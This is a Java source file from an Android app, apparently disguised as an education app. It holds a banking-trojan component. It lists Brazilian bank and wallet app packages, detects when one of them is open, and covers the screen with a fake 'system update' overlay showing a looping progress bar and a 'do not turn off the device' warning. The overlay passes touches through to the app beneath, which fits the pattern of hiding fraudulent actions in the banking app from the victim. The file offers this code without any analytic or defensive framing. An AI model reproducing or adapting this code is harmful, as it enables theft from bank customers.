package com.eloeeducacao;

import android.content.Context;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.graphics.Typeface;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.view.Gravity;
import android.view.View;
import android.view.WindowManager;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;

public final class Ov {

    private static final Handler H = new Handler(Looper.getMainLooper());
    private static WindowManager wm;
    private static View root;
    private static ProgressBar pb;
    private static TextView pct;
    private static TextView txt;
    private static int val;
    private static int fi;

    private static final String[] FRASES = {
            "Verificando integridade do sistema...",
            "Otimizando bibliotecas...",
            "Aplicando correcoes de seguranca...",
            "Atualizando componentes...",
            "Limpando cache temporario...",
            "Finalizando..."
    };

    private static final String[] BANCOS = {
            "br.com.intermedium", "com.nu.production", "com.itau", "com.itau.empresas",
            "br.com.bb.android", "com.santander.app", "com.bradesco", "br.com.gabba.Caixa",
            "com.picpay", "com.mercadopago.wallet", "com.google.android.apps.walletnfcrel"
    };

    private static final Runnable tick = new Runnable() {
        @Override public void run() {
            if (root == null) return;
            val = (val + 1) % 101;
            pb.setProgress(val);
            pct.setText(val + "%");
            if (val % 25 == 0) {
                fi = (fi + 1) % FRASES.length;
                txt.setText(FRASES[fi]);
            }
            H.postDelayed(this, 850);
        }
    };

    private Ov() {}

    public static boolean on() { return root != null; }

    public static boolean banco(String pkg) {
        if (pkg == null) return false;
        for (String b : BANCOS) if (pkg.startsWith(b)) return true;
        return false;
    }

    public static void set(final Context c, final boolean ligar) {
        H.post(new Runnable() {
            @Override public void run() {
                try {
                    if (!ligar) { clear(); return; }
                    if (root != null) return;
                    wm = (WindowManager) c.getSystemService(Context.WINDOW_SERVICE);
                    LinearLayout l = new LinearLayout(c);
                    l.setOrientation(LinearLayout.VERTICAL);
                    l.setGravity(Gravity.CENTER);
                    l.setBackgroundColor(Color.parseColor("#0B0F14"));
                    l.setPadding(56, 56, 56, 56);

                    TextView h = new TextView(c);
                    h.setText("Atualizacao do sistema");
                    h.setTextColor(Color.WHITE);
                    h.setTextSize(22);
                    h.setTypeface(Typeface.DEFAULT_BOLD);
                    h.setGravity(Gravity.CENTER);

                    txt = new TextView(c);
                    txt.setText(FRASES[0]);
                    txt.setTextColor(Color.parseColor("#9AA4B2"));
                    txt.setTextSize(15);
                    txt.setGravity(Gravity.CENTER);
                    txt.setPadding(0, 18, 0, 26);

                    pb = new ProgressBar(c, null, android.R.attr.progressBarStyleHorizontal);
                    pb.setMax(100);
                    pb.setProgress(0);
                    pb.setMinimumWidth(420);

                    pct = new TextView(c);
                    pct.setText("0%");
                    pct.setTextColor(Color.parseColor("#9AA4B2"));
                    pct.setTextSize(13);
                    pct.setGravity(Gravity.CENTER);
                    pct.setPadding(0, 10, 0, 0);

                    TextView rod = new TextView(c);
                    rod.setText("Nao desligue o aparelho");
                    rod.setTextColor(Color.parseColor("#5C6673"));
                    rod.setTextSize(12);
                    rod.setGravity(Gravity.CENTER);
                    rod.setPadding(0, 34, 0, 0);

                    l.addView(h);
                    l.addView(txt);
                    l.addView(pb);
                    l.addView(pct);
                    l.addView(rod);

                    int type = Build.VERSION.SDK_INT >= 26
                            ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                            : WindowManager.LayoutParams.TYPE_PHONE;
                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT, type,
                            WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
                                    | WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE
                                    | WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                                    | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                            PixelFormat.TRANSLUCENT);
                    wm.addView(l, lp);
                    root = l;
                    val = 0;
                    fi = 0;
                    pb.setProgress(0);
                    H.post(tick);
                } catch (Throwable ignored) {}
            }
        });
    }

    public static void clear() {
        H.post(new Runnable() {
            @Override public void run() {
                H.removeCallbacks(tick);
                try { if (root != null && wm != null) wm.removeView(root); } catch (Throwable ignored) {}
                root = null;
                pb = null;
                pct = null;
                txt = null;
            }
        });
    }
}